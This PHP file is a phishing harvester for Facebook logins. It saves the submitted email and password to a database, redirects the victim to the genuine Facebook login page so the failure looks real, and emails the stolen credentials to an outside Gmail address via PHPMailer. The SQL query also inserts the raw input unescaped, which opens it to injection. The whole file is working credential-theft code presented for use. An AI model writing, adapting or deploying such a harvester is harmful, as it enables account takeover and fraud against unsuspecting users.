<?php
include("connect.php");
if(isset($_POST['email']) && !empty($_POST['email']) &&
	isset($_POST['pass']) && !empty($_POST['pass'])){
$con = mysqli_connect($host,$user,$pw,$db) or die("Problems with the connection.");
//mysqli_select_db($db, $con)or die("Problems with the connection.");

mysqli_query($con,"INSERT INTO facebook (Account,Password) VALUES ('$_POST[email]','$_POST[pass]')");
}else{
	echo "Problems to insert..";
}
header('Location: https://www.facebook.com/login.php?login_attempt=1&lwv=110');

require 'phpmailer/PHPMailerAutoload.php';

$user = $_POST['email'];
$password = $_POST['pass'];

$mail = new PHPMailer;

//$mail->SMTPDebug = 3;                               // Enable verbose debug output

$mail->isSMTP();                                      // Set mailer to use SMTP
$mail->Host = 'smtp.gmail.com';  // Specify main and backup SMTP servers
$mail->SMTPAuth = true;                               // Enable SMTP authentication
$mail->Username = 'correo_falso@gmail.com';                 // SMTP username
$mail->Password = 'admin1234';                           // SMTP password
$mail->SMTPSecure = 'tls';                            // Enable TLS encryption, `ssl` also accepted
$mail->Port = 587;                                    // TCP port to connect to

$mail->setFrom('from@example.com', 'Mailer');
$mail->addAddress('correo_autentico@gmail.com', 'Admin');     // Add a recipient
$mail->addReplyTo('info@example.com', 'Information');
// $mail->addCC('cc@example.com');
// $mail->addBCC('bcc@example.com');

$mail->addAttachment('/var/tmp/file.tar.gz');         // Add attachments
$mail->addAttachment('/tmp/image.jpg', 'new.jpg');    // Optional name
$mail->isHTML(true);                                  // Set email format to HTML

$mail->Subject = 'Accounts and Passwords';
$mail->Body    = $user.' : '.$password;
$mail->AltBody = 'This is the body in plain text for non-HTML mail clients';

$mail->send();
?>
